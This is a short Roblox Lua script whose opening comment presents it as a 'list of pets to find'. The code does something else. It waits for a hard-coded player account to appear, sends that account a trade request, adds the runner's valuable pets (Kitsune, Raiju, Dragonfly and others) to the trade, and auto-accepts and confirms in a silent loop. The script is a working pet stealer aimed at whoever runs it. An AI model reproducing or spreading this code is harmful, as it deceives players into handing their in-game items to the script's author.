-- danh sách pet cần tìm
repeat task.wait() until game:IsLoaded()
wait(10)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local AddItem = ReplicatedStorage.GameEvents.TradeEvents.AddItem -- RemoteEvent 
local Accept = ReplicatedStorage.GameEvents.TradeEvents.Accept
local Confirm = ReplicatedStorage.GameEvents.TradeEvents.Confirm
local SendRequest = ReplicatedStorage.GameEvents.TradeEvents.SendRequest -- RemoteEvent 
local TradingUI = game:GetService("Players").LocalPlayer.PlayerGui.TradingUI
local playerNameToCheck = "ThanhTuoi_IsFake"

function equipticket()
	for _, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
		if string.find(string.lower(tool.Name), string.lower("Trading Ticket")) then
			game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
			print("Đã trang bị:", tool.Name)
			break -- Nếu chỉ muốn equip cái đầu tiên tìm thấy
		end
	end
end
function additem()
	local listpet = {"Kitsune", "Dragonfly", "French", "Raiju","Red Fox","Mimic Octopus"} 
	for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
		for _, petName in ipairs(listpet) do
			if string.find(v.Name, petName) then
				local uuid = v:GetAttribute("PET_UUID")
				AddItem:FireServer(
					"Pet",
					uuid
				)
			end
		end
	end
end
while wait(2) do
	pcall(function ()
		if TradingUI.Enabled then
		additem()
		if TradingUI.Main.Main.AcceptButton.Main.TextLabel.Text == "Accept" then
			Accept:FireServer()
		end
		if TradingUI.Main.Main.AcceptButton.Main.TextLabel.Text == "Confirm" then
			Confirm:FireServer()
		end
	else
		local playerFound = game.Players:FindFirstChild(playerNameToCheck)
		print(playerFound)
		if playerFound then
			equipticket()
			SendRequest:FireServer(
				Players.ThanhTuoi_IsFake
			)
		else
				wait(10)
		end
	end
	end)
end
